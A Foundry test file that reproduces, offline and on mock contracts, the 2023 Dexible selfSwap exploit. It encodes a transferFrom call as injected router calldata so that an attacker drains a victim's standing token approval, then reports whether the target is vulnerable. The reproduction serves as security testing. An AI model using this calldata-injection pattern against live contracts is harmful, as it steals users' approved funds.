// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {DexibleClone} from "../fixtures/malicious-calldata/b-incident/DexibleClone.sol";

/// @title malicious-calldata tier (b): Dexible selfSwap exploit (2023-02-17, Ethereum, ~$2M).
/// @notice Minimized offline reproduction of the documented mechanism: the v2 selfSwap path
///         executed a caller-supplied router + calldata with no router validation. The
///         attacker set the router to a victim's approved token and the calldata to
///         transferFrom(victim, attacker, amount); the call ran with msg.sender == Dexible
///         and drained the victim's standing approval. See PROVENANCE.md.
contract DexibleIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 180_000e18; // representative, scaled
    address constant VICTIM = address(0x7211);
    address constant ATTACKER = address(0xBAD53);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_dexible_selfSwap_arbitraryCall_drains() public {
        MockERC20 token = new MockERC20();
        DexibleClone dexible = new DexibleClone();

        // A trader holds funds and grants Dexible an approval (the exploited standing state).
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(dexible), type(uint256).max);

        // ATTACK: selfSwap with router=token, routerData=transferFrom(victim -> attacker).
        bytes memory injected =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM, ATTACKER, VICTIM_BALANCE);
        vm.prank(ATTACKER);
        dexible.selfSwap(address(token), injected);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("dexible-selfswap-victim", drained);

        assertTrue(drained, "unvalidated selfSwap router call should drain the approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim");
    }
}
